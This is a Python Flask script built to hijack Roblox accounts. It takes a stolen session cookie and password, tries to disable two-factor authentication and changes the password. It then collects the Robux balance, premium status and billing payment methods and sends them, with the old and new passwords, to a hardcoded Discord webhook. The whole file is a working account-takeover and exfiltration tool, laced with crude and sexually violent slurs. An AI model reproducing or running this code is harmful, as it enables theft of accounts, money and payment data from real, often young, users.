from flask import Flask, request, jsonify, render_template
import requests
import json
from datetime import datetime
import webbrowser
import threading

app = Flask(__name__)

# Config
WEBHOOK_URL = "https://discord.com/api/webhooks/1282331796230639688/Fd6QZhnL9H0YF6EPp7HHKhMLJx2E-alg4zNz-NchdfxMKrNk0MuB9-FkAsZyAc8AgGi1"
ROBLOX_API = {
    "2FA_DISABLE": "https://twostepverification.roblox.com/v1/users/authenticated/configuration/",
    "PASSWORD_CHANGE": "https://accountsettings.roblox.com/v1/password",
    "ACCOUNT_DETAILS": "https://accountinformation.roblox.com/v1/description"
}

def gut_account(cookie, password, new_password):
    session = requests.Session()
    session.cookies.set(".ROBLOSECURITY", cookie)

    # Disable 2FA (good fucking luck with this)
    try:
        csrf = session.post("https://auth.roblox.com/v2/login").headers["X-CSRF-TOKEN"]
        headers = {"X-CSRF-TOKEN": csrf}
        session.delete(ROBLOX_API["2FA_DISABLE"], headers=headers)
    except:
        pass  # 2FA’s still cockblocking you

    # Password change rape
    payload = {
        "currentPassword": password,
        "newPassword": new_password
    }
    session.patch(ROBLOX_API["PASSWORD_CHANGE"], json=payload)

def build_ultra_embed(username, password, new_pass, data):
    embed = {
        "title": "ACCOUNT RAPED - FULL SPOILS",
        "color": 0x800080,  # Purple, like your bruised ego
        "fields": [
            {"name": "USERNAME", "value": f"```{username}```", "inline": True},
            {"name": "OLD PASSWORD", "value": f"```{password}```", "inline": True},
            {"name": "NEW PASSWORD", "value": f"```{new_pass}```", "inline": True},
            {"name": "ACCOUNT AGE", "value": f"`{data['age_days']} days`", "inline": True},
            {"name": "BALANCE", "value": f"**Robux**: {data['robux']}\n**Pending**: {data['pending']}", "inline": True},
            {"name": "LIMITED?", "value": f"`{data['limited']}`", "inline": True},
            {"name": "RAP / OWNED", "value": f"RAP: {data['rap']}\nOwned: {data['owned']}", "inline": False},
            {"name": "BILLING", "value": f"```{json.dumps(data['billing'], indent=2)}```", "inline": False},
            {"name": "PREMIUM STATUS", "value": f"```{data['premium']}```", "inline": True}
        ],
        "thumbnail": {"url": "https://i.imgur.com/DEADLINK.png"}
    }
    return {"embeds": [embed]}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/fuck-account', methods=['POST'])
def fuck_account():
    data = request.json
    cookie = data.get('cookie')
    password = data.get('password')
    new_password = data.get('new_password')

    if not cookie or not password or not new_password:
        return jsonify({"error": "Missing cookie, password, or new password, you dumb fuck."}), 400

    session = requests.Session()
    session.cookies.set(".ROBLOSECURITY", cookie)

    try:
        # Fetch account details
        profile = session.get("https://users.roblox.com/v1/users/authenticated").json()
        created = datetime.strptime(profile['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
        age_days = (datetime.now() - created).days

        # Fetch Robux balance
        robux = session.get("https://economy.roblox.com/v1/users/authenticated/robux").json().get("robux", 0)

        # Fetch premium status
        premium = session.get("https://premiumfeatures.roblox.com/v1/users/authenticated/premium/membership").json().get("hasMembership", False)

        # Fetch billing info
        billing = session.get("https://billing.roblox.com/v1/payment-methods").json().get("data", [])

        # Gut the account
        gut_account(cookie, password, new_password)

        # Build data payload
        data = {
            "username": profile['name'],
            "age_days": age_days,
            "robux": robux,
            "pending": 0,  # Placeholder for pending funds
            "limited": profile.get("isBanned", False),
            "rap": 0,  # RAP requires item scraping
            "owned": 0,
            "billing": billing,
            "premium": premium
        }

        # Send embed to webhook
        payload = build_ultra_embed(profile['name'], password, new_password, data)
        requests.post(WEBHOOK_URL, json=payload)

        return jsonify({"success": "Account gutted. Check your webhook, degenerate."}), 200
    except Exception as e:
        return jsonify({"error": f"Roblox cockblocked you: {str(e)}"}), 500

def open_browser():
    webbrowser.open("http://127.0.0.1:5000")

if __name__ == '__main__':
    threading.Thread(target=open_browser).start()
    app.run(debug=True)
